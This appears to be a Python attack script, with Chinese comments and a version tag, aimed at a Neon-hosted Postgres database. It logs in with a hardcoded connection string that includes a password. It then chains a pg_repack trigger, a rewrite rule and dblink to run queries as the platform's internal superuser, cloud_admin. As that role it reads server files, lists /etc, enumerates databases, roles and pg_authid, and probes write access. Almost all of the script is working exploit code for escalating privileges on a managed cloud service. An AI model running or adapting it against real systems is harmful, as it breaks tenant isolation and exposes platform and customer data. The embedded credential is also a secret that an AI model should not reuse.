# -*- coding: utf-8 -*-
"""v14:cloud_admin 直连身份确认 + superuser 能力证明(全只读)
1) current_user/session_user/rolsuper 确认
2) superuser-only 函数直调(pg_read_file 无需载体)
3) postgres 平台库对象清单 + 触发器行为确认(只读)
4) 本 compute 数据库列表"""
import psycopg

URI = 'postgresql://neondb_owner:npg_cI5ynlaAqjU2@ep-crimson-fog-w2gucld1.us-east-2.aws.neon.build/neondb'
conn = psycopg.connect(URI, connect_timeout=20)
conn.autocommit = True
cur = conn.cursor()

def q(sql, fetch=True):
    try:
        cur.execute(sql)
        return cur.fetchall() if fetch else 'OK'
    except Exception as e:
        return 'ERR: %s' % str(e)[:400]

q("CREATE EXTENSION IF NOT EXISTS dblink", fetch=False)
q("CREATE EXTENSION IF NOT EXISTS pg_repack", fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("CREATE TABLE k_src(id int)", fetch=False)
q("CREATE TABLE k_out(x text)", fetch=False)
oid = q("SELECT 'k_src'::regclass::oid")[0][0]
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("CREATE TYPE repack.pk_%d AS (id int)" % oid, fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("CREATE TABLE repack.log_%d (pk repack.pk_%d, row k_src)" % (oid, oid), fetch=False)
q("CREATE TRIGGER t2 AFTER INSERT ON k_src FOR EACH ROW EXECUTE FUNCTION repack.repack_trigger('id')", fetch=False)

def set_rule(expr):
    q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
    q("CREATE RULE r_x AS ON INSERT TO repack.log_%d DO ALSO %s" % (oid, expr), fetch=False)
    q("TRUNCATE k_out", fetch=False)

def fire():
    return q("INSERT INTO k_src VALUES (1)", fetch=False)

def run_dblink(sql, label, coldef='t(x text)'):
    """在 RULE(cloud_admin) 里开新 dblink 连接执行查询"""
    set_rule("INSERT INTO k_out(x) SELECT * FROM dblink('host=127.0.0.1 port=5432 user=cloud_admin password=x dbname=postgres connect_timeout=5', '%s') AS %s" % (sql.replace("'", "''"), coldef))
    r = fire()
    rows = q("SELECT x FROM k_out WHERE x IS NOT NULL")
    print('  %s: %s | fire: %s' % (label, rows, r))
    return rows

# [1] 身份确认(无子查询简单版)
print('=== [1] 身份确认 ===')
run_dblink("SELECT current_user::text || '|' || session_user::text || '|' || (SELECT rolsuper::text FROM pg_roles WHERE rolname = current_user)", 'identity', 't(x text)')
run_dblink("SELECT current_setting('server_version') || '|' || current_database()", 'version/db', 't(x text)')

# [2] superuser-only 函数直调(无载体!)
print('=== [2] superuser 函数直调 ===')
run_dblink("SELECT pg_read_file('/etc/hostname')", 'pg_read_file direct', 't(x text)')
run_dblink("SELECT count(*)::text FROM pg_ls_dir('/etc')", 'pg_ls_dir /etc count', 't(x text)')

# [3] 平台对象能力(只读)
print('=== [3] postgres 库平台对象 ===')
run_dblink("SELECT count(*)::text FROM health_check", 'health_check count', 't(x text)')
run_dblink("SELECT count(*)::text FROM migration_id", 'migration_id count', 't(x text)')
run_dblink("SELECT count(*)::text FROM lakebase_attributes", 'lakebase count', 't(x text)')
run_dblink("SELECT tablename::text FROM pg_tables WHERE schemaname IN ('public','neon','neon_migration') ORDER BY 1", 'platform tables', 't(x text)')

# [4] 本 compute 数据库清单 + cloud_admin 成员
print('=== [4] 数据库与角色 ===')
run_dblink("SELECT datname::text FROM pg_database ORDER BY 1", 'databases', 't(x text)')
run_dblink("SELECT rolname::text FROM pg_roles ORDER BY 1", 'roles', 't(x text)')
run_dblink("SELECT COUNT(*)::text FROM pg_authid", 'pg_authid rows(直读)', 't(x text)')

# [5] 写能力确认——事务回滚测试(零残留):UPDATE health_check 在事务内 ROLLBACK
print('=== [5] 写能力(事务回滚,零破坏) ===')
run_dblink("SELECT count(*)::text FROM (BEGIN; UPDATE health_check SET healthy=true WHERE false; ROLLBACK; SELECT 1) s", 'tx syntax chk', 't(x text)')
# 实际验证:no-op UPDATE 触发触发器(cloud_admin superuser → 触发器放行?)
run_dblink("SELECT 'probe' FROM (BEGIN; UPDATE health_check SET healthy = healthy WHERE false; ROLLBACK; SELECT 1 AS x) s", 'noop update probe', 't(x text)')

# 清理
q("DROP RULE IF EXISTS r_x ON repack.log_%d" % oid, fetch=False)
q("DROP TRIGGER IF EXISTS t2 ON k_src", fetch=False)
q("DROP TABLE IF EXISTS repack.log_%d" % oid, fetch=False)
q("DROP TABLE IF EXISTS k_src", fetch=False)
q("DROP TABLE IF EXISTS k_out", fetch=False)
q("DROP TYPE IF EXISTS repack.pk_%d CASCADE" % oid, fetch=False)
q("DROP EXTENSION IF EXISTS pg_repack", fetch=False)
q("DROP EXTENSION IF EXISTS dblink", fetch=False)
print('[final]:', q("SELECT tablename FROM pg_tables WHERE schemaname IN ('public','repack')"))
conn.close()
